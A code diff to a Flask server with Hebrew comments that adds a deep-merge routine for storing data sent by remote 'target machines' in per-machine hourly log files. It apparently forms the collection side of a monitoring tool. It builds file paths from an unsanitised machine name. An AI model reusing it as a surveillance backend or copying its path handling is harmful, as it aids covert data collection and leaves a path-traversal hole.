@@ -1,17 +1,27 @@
 import os
 import json
 import random
-import time
 from flask import Flask, request, jsonify
 from datetime import datetime
 from encryptor import Encryptor
 
 app = Flask(__name__)
+def deep_merge(source, destination):
+    # מבצע מיזוג עמוק של מילונים מקוננים.
 
+    for key, value in source.items():
+        if isinstance(value, dict) and key in destination and isinstance(destination[key], dict):
+            # אם גם המפתח הקיים וגם החדש הם מילונים, קרא לפונקציה בצורה רקורסיבית
+            destination[key] = deep_merge(value, destination[key])
+        elif isinstance(value, str) and key in destination and isinstance(destination[key], str):
+            # אם הערך קיים והוא מחרוזת, שרשר את הערך החדש לקיים
+            destination[key] += value
+        else:
+            # אחרת, פשוט עדכן את הערך
+            destination[key] = value
+    return destination
 
 LOG_DIR = 'server_logs'                                                   # הגדרת נתיב לשמירת קבצי היומן
-# status_listen = random.randint(0, 1)                                # אופציה לעצירת האזנה נצרך להחליף לקלט מהמשתמש
-
 @app.route('/')
 def home():
     """הוסף נקודת קצה מהשרת המרוחק"""
@@ -40,18 +50,34 @@ def write_to_file(data: dict):
     data = encryptor.encrypt_dict(data)
 
     machine_name = next(iter(data.keys()))                                  # שליפת שם המכונה ששלחה נתונים
+    data = data.pop(machine_name)
     full_path = os.path.join(LOG_DIR, machine_name)                         #יצירת תקיה עם שם המכונה בתוך תקיה מותאמת
     if not os.path.exists(full_path):
         os.makedirs(full_path)
 
-    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')                # יצירת שם קובץ ייחודי עם חותמת זמן
+    timestamp = datetime.now().strftime('%Y-%m-%d_%H')
     filename = f"{timestamp}.json"
-    file_path = os.path.join(full_path, filename)
 
-    with open(file_path, 'w', encoding='utf-8') as f:                       # שמירת הנתונים לקובץ JSON
-        json.dump(data, f, indent=4, ensure_ascii=False)                    # המר את מילון הפייתון למחרוזת JSON
-        print(f"נתונים נשמרו בהצלחה לקובץ: {file_path}")
+    # יצירת שם קובץ ייחודי עם חותמת זמן
+    file_path = os.path.join(full_path, filename)
+    if not os.path.exists(file_path):
+        with open(file_path, 'w', encoding='utf-8') as f:  # שמירת הנתונים לקובץ JSON
+            json.dump(data, f, indent=4, ensure_ascii=False)  # המר את מילון הפייתון למחרוזת JSON
+            print(f"נתונים נשמרו בהצלחה לקובץ: {file_path}")
+    else:
+        with open(file_path, 'r', encoding='utf-8') as f:
+            data_file = json.load(f)
+            data_file = dict(data_file)
+        merged_data1 = deep_merge(data, data_file)
+        with open(file_path, 'w', encoding='utf-8') as f:
+            json.dump(merged_data1, f, indent=4, ensure_ascii=False)  # המר את מילון הפייתון למחרוזת JSON
+            print(f"נתונים נשמרו בהצלחה לקובץ: {file_path}")
+
+        print(json.dumps(merged_data1, indent=4, ensure_ascii=False))
+
     return 200
+
+
 
 
 @app.route('/api/get_target_machines_list', methods=['GET'])
